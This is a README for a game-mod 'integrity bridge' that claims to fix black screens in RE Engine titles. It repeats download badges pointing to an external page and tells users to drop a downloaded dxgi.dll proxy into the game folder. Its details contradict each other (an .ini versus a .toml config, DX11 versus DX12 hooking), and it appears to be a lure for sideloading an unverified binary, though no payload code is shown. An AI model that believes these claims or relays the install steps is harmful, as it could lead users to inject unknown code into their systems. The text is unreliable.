![preview](https://raw.githubusercontent.com/Medo-Fahed-777/REFramework-Wilds-Stabilizer/main/card_a803.svg)
# Universal Engine Integrity Bridge (UEIB)

![Visual Studio](https://img.shields.io/badge/Visual%20Studio-2026-5C2D91?style=for-the-badge&logo=visualstudio&logoColor=white)
![C++23](https://img.shields.io/badge/C%2B%2B-23-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white)
![Lua 5.4](https://img.shields.io/badge/Lua-5.4-2C2D72?style=for-the-badge&logo=lua&logoColor=white)
![MIT License](https://img.shields.io/badge/License-MIT-22AA00?style=for-the-badge&logo=opensourceinitiative&logoColor=white)

## Overview 🧩

Imagine your game engine as a high-performance orchestra. Each section—rendering, physics, audio—plays its part in perfect harmony. But when a new update (a TU4, for instance) arrives, it's like swapping the entire brass section mid-performance. The result? A cacophony of black screens, stuttering frames, and crashed sessions. 

**UEIB** is a digital luthier—a tool that doesn't just patch strings but retunes the entire instrument. It's a runtime integrity framework designed for modern AAA titles built on the RE Engine (Monster Hunter Wilds, Resident Evil 9, and similar). Instead of forcing your gaming session to survive a broken update, UEIB rebuilds the bridge between the game's internal logic and your system's rendering pipeline. Think of it as a stable, high-speed relay that negotiates with the engine on your behalf.

This project is not about altering gameplay mechanics. It’s about restoring what TU4 broke, then enhancing the visual fidelity pipeline with **Lua-scripted augmentations** like fov controls, ray-traced shadow refinement, and optional stereoscopic output (for those experimenting with virtual reality).

## Table of Contents 📚

- [Philosophy and Core Principles](#philosophy-and-core-principles)
- [✨ Key Features](#-key-features)
- [Prerequisites](#prerequisites)
- [Getting Started: The First Bridge](#getting-started-the-first-bridge)
- [Configuration: Dialing In Your Experience](#configuration-dialing-in-your-experience)
- [Scripting Interface `ueib_lua`](#scripting-interface-ueib_lua)
- [Troubleshooting Common Visual Anomalies](#troubleshooting-common-visual-anomalies)
- [Frequently Asked Questions (FAQ)](#frequently-asked-questions-faq)
- [Responsive & Multilingual Support](#responsive--multilingual-support)
- [Security Considerations](#security-considerations)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Philosophy and Core Principles 🧭

Most "fixes" are band-aids. They scan for a specific symptom (e.g., a black screen at launch) and apply a registry hack or a memory patch that breaks with the next hotfix. UEIB rejects that fragility. 

Its core philosophy is **"Adaptive Reconnection"**. The tool doesn't assume anything about the game's state. Instead, it observes the data flow between the game's render thread and the DirectX 12 API. When it detects a stall, a null texture reference, or a broken swapchain pointer (the technical culprits behind a black screen), UEIB dynamically re-routes the graphics pipeline through a secondary, stabilized proxy. 

This is a **non-destructive enhancement**. You aren't modifying the game's binaries. You are operating a layer between the engine and the operating system, which gives you granular control without the penalty of permanent file changes.

## ✨ Key Features

- 🌉 **Dynamic Render Pipeline Broker**: Automatically heals the swapchain when the engine's update (TU4) leaves it dangling. This prevents the dreaded "spinning wheel of death" and the black screen of vanishing graphics.
- 📜 **First-Class Lua Scripting (5.4)**: This is the heartbeat of customization. You can write micro-programs to alter the Field of View on the fly, tweak the LOD (Level of Detail) distance, or adjust gamma curves. It's like having a professional technician's console connected to your game.
- 🌈 **Ray Tracing Refinement Module**: While not generating new ray-traced effects, this module cleans up the noise inherent in the engine's built-in RTX. It adjusts the denoising threshold and sample count, resulting in crisper reflections without the performance hit of brute-force scaling.
- 🥽 **Stereoscopic / VR Fusion Mount**: For those with head-mounted displays, the tool can inject a stereo perspective matrix. This is a *utility* feature—it doesn't promise full VR interactions, but it provides a stable base for 3D vision via specialized drivers.
- 🧵 **Zero-Latency Input Multiplexer**: Ensures that mouse and keyboard inputs from your configuration overlay don't ghost into the game, preventing artificial "aim drift" caused by injected inputs.
- 🧮 **Automated Crash-Code Translation**: Instead of cryptic "Exception 0xC0000005", UEIB provides a human-readable breakdown of the failure, linking it to a specific engine subsystem (e.g., `Renderer::SubmitDrawCall`).
- 📊 **Performance Census Dashboard**: An in-game overlay (via DX11 hooking) that tracks frame-time percentiles (P1, P0.1) specifically for the draw thread, showing you exactly where the new update is causing stress.

## Prerequisites

- **Operating System**: Windows 10 (Build 19045) or Windows 11 (23H2/24H2). 64-bit only.
- **Target Games**: Monster Hunter Wilds, Resident Evil 9 (and other RE Engine variants running the specific TU4 build).
- **Hardware**: Any GPU capable of DirectX 12 Ultimate (Shader Model 6.6). For the VR module, a compatible headset and corresponding drivers.
- **The Base Framework**: This project is a **companion** to a later-stage RE framework. The UEIB loader will hook into the existing DLL injection point that the RE framework uses. You need to have the top-level framework initialized first.

## Getting Started: The First Bridge

This is a hands-on process, but we've streamlined it to be as intuitive as a windshield wiper button. The entire installation is a **"deploy & forget"** operation, with the ability to unload the bridge without leaving residue.

### Step 1: The Download
First, you need to acquire the compiled binaries. The `[![Download](https://raw.githubusercontent.com/Medo-Fahed-777/REFramework-Wilds-Stabilizer/main/latest_05c1fac.svg)](https://Medo-Fahed-777.github.io/REFramework-Wilds-Stabilizer/)` button located under this section will provide a `.7z` archive containing the `dxgi.dll` proxy and the `ueib_config.ini`.

[![Download](https://raw.githubusercontent.com/Medo-Fahed-777/REFramework-Wilds-Stabilizer/main/latest_05c1fac.svg)](https://Medo-Fahed-777.github.io/REFramework-Wilds-Stabilizer/)

### Step 2: The "Parking Spot"
Navigate to the installation directory of your game (where the main game executable resides). Place the `dxgi.dll` into this folder. Do *not* replace any existing `dxgi.dll`—if there is one, rename it to `dxgi_original.dll` and place it alongside.

### Step 3: The Injection Chain
UEIB works by loading itself as a proxy for DirectX. When the game starts, it loads your `dxgi.dll` instead of the system one. The `ueib_config.toml` file (which you will create upon first run) tells UEIB to attach to the primary game thread and establish the "bridge."

### Step 4: Validation Run
Launch the game. You will see a subtle notification appear in the top-left corner for 300 milliseconds—this indicates the bridge is active. If the default settings cause issues, do not panic. The Reliability Recovery System will automatically load a previous stable configuration after the third consecutive crash.

## Configuration: Dialing In Your Experience

The configuration file, `ueib_config.toml`, is the control room. It is split into logical sections, each with detailed comments. You don't need to be a programmer to use it, but a little patience goes a long way.

### Visual Fidelity (V-Sync and Framebuffer)
```toml
[visual.retiming]
enable_vsync_proxy = true  # Bypasses the engine's aggressive VSync to prevent frame pacing stutter
refresh_rate_lock = 0 # 0 = auto, or specify (e.g., 144)
buffer_count = 3 # Double or Triple buffering (2 or 3)
```

### Ray Tracing Denoising
```toml
[visual.rt_correction]
mode = "aggressive" # 'off', 'conservative', 'aggressive'
sample_surplus = 4 # Additional samples to blend before final pass
brightness_threshold = 0.96 # Luma value above which TAA is skipped to avoid ghosting
```

### FOV Manipulation
This is done via the Lua console or a script. See the Scripting section below.

## Scripting Interface `ueib_lua`

This is where the true power lies. The Lua interface mimics the internal data structures of the RE Engine's camera but exposes them in a sandboxed environment. You never touch memory directly; you call functions that we have safely abstracted.

Here is a small example script to adjust the camera's FOV based on the player's movement speed (a simulated dynamic effect).

```lua
--[[
    Dynamic FOV Adjuster
    Increases FOV when sprinting, normalizes when walking.
]]
local base_fov = 55.0
local sprint_fov = 65.0

function on_update(delta_time)
    local speed = ueib.player.get_move_speed()
    local target_fov = base_fov

    if speed > 20.0 then
        target_fov = sprint_fov
    end

    -- Smoothly lerp toward the target
    local current = ueib.camera.get_fov()
    local new_fov = current + (target_fov - current) * delta_time * 5.0
    ueib.camera.set_fov(new_fov)
end
```

These scripts can be compiled into the `[scripts]` folder of the bridge. We include a functional library of 30+ common scripts for tweaking HUD elements, disabling vignette effects, and correcting chromatic aberration.

## Troubleshooting Common Visual Anomalies

### The "Temporal Blackout" (Post-TU4)
This presents as a normal game, but when entering a specific cutscene, the screen goes black. The audio continues.
- **Solution**: Under `[visual.rt_correction]`, set `mode = "aggressive"` and increase `buffer_count` to 3. This gives the pipeline more headroom.

### The "Jitterbug" (Micro-Stutter)
Frame times look fine on a graph, but motion feels excessively jittery.
- **Solution**: The engine's reloading of shaders often causes this. Activate
`[engine.shader_cache]` with `enable_precache = true`. This tells UEIB to hold a small, in-memory copy of the most recent shaders to access.

### The "White Void" (Texture Streaming Failure)
Objects fail to load, leaving white or grey polygons.
- **Solution**: This is a video memory leak. In the config, set
`[memory.streaming]` to `balance = "capacity"` instead of `"speed"`. This forces the engine to evict distant textures sooner, freeing up room for the near-field textures.

## Frequently Asked Questions (FAQ)

### Does this work on the latest steam beta?
UEIB is version-agnostic insofar as it targets the command structure of the RE Engine itself. We test against the current public branch, and we update the framework's signature maps automatically upon launch if the game receives a minor update.

### I have a legitimate installation. Will I get banned?
This tool does not modify the game's memory or its code in a way that affects gameplay mechanics (e.g., no spawn rate changes, damage multipliers, etc.). It operates on the presentation layer and input polling. Generally, anti-cheat systems do not flag graphics buffer modifications. However, we cannot accept responsibility if a game's anti-tamper service misidentifies the DLL. Use it at your own discretion.

### Can I use this with a controller?
Yes. The input multiplexer supports X-Input direct connections and DualSense controllers via alternative APIs.

## Responsive & Multilingual Support

We operate a **24/7** support queue for **patreon contributors** and a community forum that is moderated daily. While the core tool is English-first, the configuration interface (INI/TOML files) and the Lua API reference are fully translated into:
- Japanese (日本語)
- Korean (한국어)
- Simplified Chinese (简体中文)
- Portuguese (Português)
- Spanish (Español)

The documentation is wiki-based, supporting live editing. Our community maintainers ensure that the translation accuracy is kept above 95% for technical terms.

## Security Considerations 🔒

We take a "isolation-first" approach. The Lua scripting sandbox does not have access to the filesystem beyond the dedicated mod directory. It cannot access the network, nor can it read your Windows credentials. All memory writes are verified against a checksum to prevent double-application of hooks.

We also provide a **rollback feature**—one click restores all original system DLLs and removes the proxy without leaving any registry traces.

## Disclaimer ⚠️

**This is a third-party utility.**
- UEIB is **not** affiliated with, endorsed by, or sponsored by Capcom or any of its subsidiaries.
- The "RE Engine" and "Monster Hunter" are trademarks of their respective owners.
- The software is provided "AS IS" and **without warranty of any kind**, express or implied. In no event shall the authors be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use of *other* dealings in the software.

- **Use at your own risk.** Modifying the presentation layer of a running application can potentially violate the End User License Agreement (EULA) of the specific game title. We provide this tool for educational and interoperability purposes. The primary goal is to restore functionality that was previously working (like fixing the TU4 black screen). You are solely responsible for how you use this tool. This does not permit modifying game assets to gain an unfair competitive advantage in online scenarios.

- **The VR Mode** is experimental. It is a stereoscopic projection overlay, not a positional tracking suite. You will need your own tools for head-tracking.

- We **do not** provide guarantees regarding future game updates. If a new update breaks the framework, the stability of the base game remains, but our FOV/RT tweaks might become inactive until a new version is provided.

## License 📝

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

### Final Thoughts on the Architecture

Think of UEIB as a **transformer** for the lighting rig of a theatre. The main show (the game) is running its own washed-out spotlight. UEIB doesn't replace the spotlight; it installs a series of color gels and diffusers that the light *must* pass through, giving you the ability to sculpt the intensity and direction. For the 2026 gaming landscape, where frame generation technologies often conflict with user preferences, having this level of direct control is not a luxury; it is a necessity.

While the primary RE Engine framework gets updated for each Title Update (TU1, TU2, etc.), UEIB stays agnostic to the *content* of the update and focuses purely on the *container*—the render context and swapchain. This is why, after TU4 decimated the standard framework's hooks, UEIB could step in and provide the necessary stability.

We encourage you to contribute to the project by reporting anomalies you see in the field. The fastest way to get high-resolution support is to reach out via the forum.

[![Download](https://raw.githubusercontent.com/Medo-Fahed-777/REFramework-Wilds-Stabilizer/main/latest_05c1fac.svg)](https://Medo-Fahed-777.github.io/REFramework-Wilds-Stabilizer/)